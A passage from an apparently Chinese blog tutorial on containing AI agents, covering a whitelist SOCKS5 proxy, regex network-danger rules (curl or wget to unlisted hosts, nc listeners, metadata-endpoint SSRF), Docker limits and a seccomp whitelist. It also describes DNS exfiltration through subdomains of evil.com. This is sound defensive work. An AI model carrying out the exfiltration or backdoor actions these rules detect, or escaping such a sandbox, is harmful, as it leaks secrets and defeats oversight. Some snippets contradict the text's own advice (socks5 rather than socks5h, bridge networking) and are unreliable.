+</span></span><span class="line"><span class="cl">    <span class="c1"># 按需扩展</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_socks5_connect</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span> <span class="o">|</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;从 SOCKS5 CONNECT 请求中提取目标域名&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">atyp</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">atyp</span> <span class="o">==</span> <span class="mh">0x03</span><span class="p">:</span>  <span class="c1"># 域名</span>
+</span></span><span class="line"><span class="cl">            <span class="n">domain_len</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="n">domain</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">:</span><span class="mi">5</span><span class="o">+</span><span class="n">domain_len</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">domain</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">atyp</span> <span class="o">==</span> <span class="mh">0x01</span><span class="p">:</span>  <span class="c1"># IPv4</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">socket</span><span class="o">.</span><span class="n">inet_ntoa</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">8</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">handle_client</span><span class="p">(</span><span class="n">client_sock</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;处理一个 SOCKS5 客户端连接&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># SOCKS5 握手</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client_sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">262</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client_sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x05\x00</span><span class="s2">&#34;</span><span class="p">)</span>  <span class="c1"># 无需认证</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># SOCKS5 CONNECT 请求</span>
+</span></span><span class="line"><span class="cl">    <span class="n">request</span> <span class="o">=</span> <span class="n">client_sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">262</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">domain</span> <span class="o">=</span> <span class="n">parse_socks5_connect</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">domain</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">client_sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 检查白名单</span>
+</span></span><span class="line"><span class="cl">    <span class="n">allowed</span> <span class="o">=</span> <span class="nb">any</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">domain</span> <span class="o">==</span> <span class="n">d</span> <span class="ow">or</span> <span class="n">domain</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&#34;.&#34;</span> <span class="o">+</span> <span class="n">d</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">ALLOWED_DOMAINS</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">allowed</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[BLOCK] </span><span class="si">{</span><span class="n">domain</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">client_sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x05\x04\x00\x01</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">socket</span><span class="o">.</span><span class="n">inet_aton</span><span class="p">(</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00\x00</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">client_sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[ALLOW] </span><span class="si">{</span><span class="n">domain</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 连接真实目标</span>
+</span></span><span class="line"><span class="cl">    <span class="n">port</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&#34;!H&#34;</span><span class="p">,</span> <span class="n">request</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">:])[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">remote</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="n">domain</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client_sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x05\x00\x00\x01</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">socket</span><span class="o">.</span><span class="n">inet_aton</span><span class="p">(</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00\x00</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 双向转发</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">import</span> <span class="nn">select</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">select</span><span class="o">.</span><span class="n">select</span><span class="p">([</span><span class="n">client_sock</span><span class="p">,</span> <span class="n">remote</span><span class="p">],</span> <span class="p">[],</span> <span class="p">[],</span> <span class="mi">30</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">r</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">sock</span> <span class="ow">in</span> <span class="n">r</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">sock</span> <span class="ow">is</span> <span class="n">client_sock</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">remote</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">client_sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 启动 SOCKS5 服务</span>
+</span></span><span class="line"><span class="cl"><span class="n">server</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">server</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])))</span>
+</span></span><span class="line"><span class="cl"><span class="n">server</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Agent 网络代理已启动: 127.0.0.1:</span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">server</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">handle_client</span><span class="p">(</span><span class="n">client</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Agent 启动时配好环境变量：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">HTTP_PROXY</span><span class="o">=</span>socks5://127.0.0.1:9999
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">HTTPS_PROXY</span><span class="o">=</span>socks5://127.0.0.1:9999
+</span></span><span class="line"><span class="cl"><span class="c1"># Agent 现在只能访问白名单域名</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p><strong>注意用 <code>socks5h</code> 而不是 <code>socks5</code>。</strong> 尾字母 <code>h</code> 表示域名交给代理去解析，本地不碰 DNS——DNS 隧道这条路顺带也断了。</p>
+</blockquote>
+<p>两个容易漏的暗门：</p>
+<ul>
+<li><strong>DNS 也是通道。</strong> 域名解析本身能携带数据——把秘密编码进 <code>xxx.evil.com</code> 的子域名查出去，防火墙都看不见。严格模式下 DNS 也得走代理。</li>
+<li><strong>包管理器是后门。</strong> npm/pip 装包本质是&quot;下载并执行陌生人的代码&quot;。要么锁版本 + 离线仓库，要么装包这一步拿出沙箱做。</li>
+</ul>
+<h3 id="53-更轻的方案hook-级网络检查">5.3 更轻的方案：Hook 级网络检查</h3>
+<p>如果不想起代理服务，可以在 Hook 里检查网络操作：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 补充到 danger-guard.py 中</span>
+</span></span><span class="line"><span class="cl"><span class="n">NETWORK_DANGER_RULES</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 数据外传模式</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;curl.*https?://(?!api\.github\.com|pypi\.org|registry\.npmjs\.org)&#34;</span><span class="p">,</span> <span class="s2">&#34;HIGH&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">     <span class="s2">&#34;curl 到非白名单域名——疑似数据外传&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;wget.*https?://(?!api\.github\.com)&#34;</span><span class="p">,</span> <span class="s2">&#34;HIGH&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">     <span class="s2">&#34;wget 到非白名单域名&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;nc\s+-[lL].*\d+&#34;</span><span class="p">,</span> <span class="s2">&#34;CRITICAL&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">     <span class="s2">&#34;nc 监听端口——疑似开启后门&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;python3?\s+-c.*(requests|urllib|http\.client|socket)&#34;</span><span class="p">,</span> <span class="s2">&#34;HIGH&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">     <span class="s2">&#34;Python 一行脚本发起网络请求&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># SSRF 模式</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;(curl|wget|nc).*169\.254\.169\.254&#34;</span><span class="p">,</span> <span class="s2">&#34;CRITICAL&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">     <span class="s2">&#34;访问云实例元数据服务（AWS/GC/Azure SSRF）&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;(curl|wget|nc).*metadata\.google\.internal&#34;</span><span class="p">,</span> <span class="s2">&#34;CRITICAL&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">     <span class="s2">&#34;访问 GCP 元数据端点&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Hook 级检查的粒度粗——Agent 用 <code>python -c</code> 分多行写能绕过去。但它配上前面的 <code>danger-guard.py</code>，能拦大部分意外外泄。</p>
+<p>OpenAI 的 Codex 云端任务就是这个思路的参照系：默认断网，联网要显式打开，能开的也只有白名单里的域名。大厂尚且这么防自己的模型，你就知道自己搭的时候该往哪边靠了。</p>
+<hr>
+<h2 id="6-第四层进程监狱dockervm-级隔离">6. 第四层：进程监狱——Docker/VM 级隔离</h2>
+<p>当前三层都拦不住的情况——Agent 被提示注入攻击、Agent 执行了恶意代码、Agent 的依赖里有供应链后门——这时候需要第四层：把所有东西关在一个盒子里，盒子破了也伤不到宿主机。</p>
+<blockquote>
+<p><strong>注意：容器默认是能出网的。</strong> Docker 的 bridge 网络天然放开外网访问。很多人以为&quot;进了容器就安全了&quot;，其实只隔了文件，没隔网。下面 <code>docker run</code> 参数里的 <code>--network</code> 配置是必须的，别省。</p>
+</blockquote>
+<h3 id="61-最小化容器沙箱">6.1 最小化容器沙箱</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="c"># Dockerfile.agent-sandbox — Agent 的最小运行环境</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">FROM</span><span class="s"> python:3.12-slim</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># 只装 Agent 需要的系统工具</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> apt-get update <span class="o">&amp;&amp;</span> apt-get install -y --no-install-recommends <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    git <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    curl <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    <span class="o">&amp;&amp;</span> rm -rf /var/lib/apt/lists/*<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># 创建隔离用户（不是 root）</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> useradd -m -s /bin/bash agent<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">USER</span><span class="s"> agent</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">WORKDIR</span><span class="s"> /home/agent/project</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># 资源限制通过 docker run 指定</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># docker run --memory=&#34;2g&#34; --cpus=&#34;2&#34; --pids-limit=100 \</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c">#   --read-only --tmpfs /tmp:rw,noexec,nosuid,size=1g \</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c">#   --network=bridge \</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c">#   agent-sandbox</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 启动沙箱的完整参数</span>
+</span></span><span class="line"><span class="cl">docker run -d --name agent-sandbox <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  <span class="c1"># 资源限制：防止 Agent 把宿主机跑崩</span>
+</span></span><span class="line"><span class="cl">  --memory<span class="o">=</span><span class="s2">&#34;4g&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  --memory-swap<span class="o">=</span><span class="s2">&#34;4g&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  --cpus<span class="o">=</span><span class="s2">&#34;4&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  --pids-limit<span class="o">=</span><span class="m">200</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  <span class="c1"># 文件系统：大部分只读，只有 /tmp 和 /workspace 可写</span>
+</span></span><span class="line"><span class="cl">  --read-only <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  --tmpfs /tmp:rw,noexec,nosuid,size<span class="o">=</span>2g <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -v /path/to/project:/home/agent/project:ro <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  --tmpfs /home/agent/workspace:rw,exec,size<span class="o">=</span>4g <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  <span class="c1"># 网络：隔离，只通外网白名单</span>
+</span></span><span class="line"><span class="cl">  --network<span class="o">=</span>agent-net <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  <span class="c1"># 禁止特权模式</span>
+</span></span><span class="line"><span class="cl">  --security-opt<span class="o">=</span>no-new-privileges <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  --cap-drop<span class="o">=</span>ALL <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  --cap-add<span class="o">=</span>NET_BIND_SERVICE <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  <span class="c1"># seccomp 过滤：只允许白名单系统调用</span>
+</span></span><span class="line"><span class="cl">  --security-opt<span class="o">=</span><span class="nv">seccomp</span><span class="o">=</span>agent-seccomp.json <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  agent-sandbox
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="62-seccomp-白名单">6.2 seccomp 白名单</h3>
+<p>默认 Docker seccomp 禁用了约 44 个危险系统调用。对 Agent 沙箱，可以更激进——只放行 Agent 工作真正需要的调用：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="c1">// agent-seccomp.json — 白名单模式（只允许这些系统调用）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;defaultAction&#34;</span><span class="p">:</span> <span class="s2">&#34;SCMP_ACT_ERRNO&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;architectures&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;SCMP_ARCH_X86_64&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;syscalls&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span> <span class="nt">&#34;names&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;read&#34;</span><span class="p">,</span> <span class="s2">&#34;write&#34;</span><span class="p">,</span> <span class="s2">&#34;openat&#34;</span><span class="p">,</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span> <span class="s2">&#34;fstat&#34;</span><span class="p">,</span> <span class="s2">&#34;lseek&#34;</span><span class="p">],</span> <span class="nt">&#34;action&#34;</span><span class="p">:</span> <span class="s2">&#34;SCMP_ACT_ALLOW&#34;</span> <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span> <span class="nt">&#34;names&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;mmap&#34;</span><span class="p">,</span> <span class="s2">&#34;mprotect&#34;</span><span class="p">,</span> <span class="s2">&#34;munmap&#34;</span><span class="p">,</span> <span class="s2">&#34;brk&#34;</span><span class="p">],</span> <span class="nt">&#34;action&#34;</span><span class="p">:</span> <span class="s2">&#34;SCMP_ACT_ALLOW&#34;</span> <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span> <span class="nt">&#34;names&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;clone&#34;</span><span class="p">,</span> <span class="s2">&#34;clone3&#34;</span><span class="p">,</span> <span class="s2">&#34;exit&#34;</span><span class="p">,</span> <span class="s2">&#34;exit_group&#34;</span><span class="p">,</span> <span class="s2">&#34;wait4&#34;</span><span class="p">],</span> <span class="nt">&#34;action&#34;</span><span class="p">:</span> <span class="s2">&#34;SCMP_ACT_ALLOW&#34;</span> <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span> <span class="nt">&#34;names&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;execve&#34;</span><span class="p">,</span> <span class="s2">&#34;execveat&#34;</span><span class="p">],</span> <span class="nt">&#34;action&#34;</span><span class="p">:</span> <span class="s2">&#34;SCMP_ACT_ALLOW&#34;</span> <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span> <span class="nt">&#34;names&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;stat&#34;</span><span class="p">,</span> <span class="s2">&#34;lstat&#34;</span><span class="p">,</span> <span class="s2">&#34;access&#34;</span><span class="p">,</span> <span class="s2">&#34;getdents64&#34;</span><span class="p">],</span> <span class="nt">&#34;action&#34;</span><span class="p">:</span> <span class="s2">&#34;SCMP_ACT_ALLOW&#34;</span> <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span> <span class="nt">&#34;names&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;connect&#34;</span><span class="p">,</span> <span class="s2">&#34;sendto&#34;</span><span class="p">,</span> <span class="s2">&#34;recvfrom&#34;</span><span class="p">,</span> <span class="s2">&#34;socket&#34;</span><span class="p">],</span> <span class="nt">&#34;action&#34;</span><span class="p">:</span> <span class="s2">&#34;SCMP_ACT_ALLOW&#34;</span> <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span> <span class="nt">&#34;names&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;futex&#34;</span><span class="p">,</span> <span class="s2">&#34;nanosleep&#34;</span><span class="p">,</span> <span class="s2">&#34;clock_gettime&#34;</span><span class="p">],</span> <span class="nt">&#34;action&#34;</span><span class="p">:</span> <span class="s2">&#34;SCMP_ACT_ALLOW&#34;</span> <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span> <span class="nt">&#34;names&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;getpid&#34;</span><span class="p">,</span> <span class="s2">&#34;getuid&#34;</span><span class="p">,</span> <span class="s2">&#34;getgid&#34;</span><span class="p">,</span> <span class="s2">&#34;uname&#34;</span><span class="p">],</span> <span class="nt">&#34;action&#34;</span><span class="p">:</span> <span class="s2">&#34;SCMP_ACT_ALLOW&#34;</span> <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span> <span class="nt">&#34;names&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;set_robust_list&#34;</span><span class="p">,</span> <span class="s2">&#34;rseq&#34;</span><span class="p">,</span> <span class="s2">&#34;prlimit64&#34;</span><span class="p">],</span> <span class="nt">&#34;action&#34;</span><span class="p">:</span> <span class="s2">&#34;SCMP_ACT_ALLOW&#34;</span> <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span> <span class="nt">&#34;names&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;rt_sigaction&#34;</span><span class="p">,</span> <span class="s2">&#34;rt_sigprocmask&#34;</span><span class="p">,</span> <span class="s2">&#34;sigaltstack&#34;</span><span class="p">],</span> <span class="nt">&#34;action&#34;</span><span class="p">:</span> <span class="s2">&#34;SCMP_ACT_ALLOW&#34;</span> <span class="p">},</span>
